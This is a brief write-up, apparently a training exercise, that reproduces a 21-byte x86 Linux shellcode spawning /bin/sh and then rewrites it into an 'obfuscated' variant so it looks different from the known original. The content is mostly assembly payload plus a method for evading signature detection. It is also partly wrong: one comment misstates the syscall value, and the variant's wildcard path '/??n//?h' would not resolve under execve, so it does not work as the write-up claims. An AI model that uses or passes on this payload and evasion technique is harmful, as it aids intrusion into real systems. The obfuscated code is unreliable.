Original shellcode:
http://shell-storm.org/shellcode/files/shellcode-575.php

Original shellcode was written by *ipv*. The paylod is rather simple: it's an execve syscall that launches /bin/sh.

    push 0xb ; 11 for execve syscall
    pop  eax ; push 0x11 into eax
    cdq ; sets edx to null
    push edx ; pushes null onto the stack
    push 0x68732f2f ; '//sh'
    push 0x6e69622f ; '/bin'
    mov  ebx, esp ; saves ESP into EBX
    xor  ecx, ecx ; null arguments
    int  0x80 ; int syscall


The shellcode is rather short at 21 bytes, so there is little to change. 

To obfuscate the shellcode we can expand some of the instructions so they seem different compared to the original shellcode. First I used different method for nulling out registers, I xor'd eax and moved it's value into the other registers. After that, I used mov instead of push-pop for the execve syscall. The name of the command has also been obfuscated, so it's less obvious.

    xor eax,eax ; null out eax
    mov edx, eax ; null out edx
    mov ecx, eax ; null out ecx
    mov al, 0xb ; 11 execve syscall
    push edx  ; push null to stack
    push 0x683f2f2f ; "//?h"
    push 0x6e3f3f2f ; "/??n"
    mov ebx, esp ; stores executable path in ebx
    int 0x80 ; init syscall
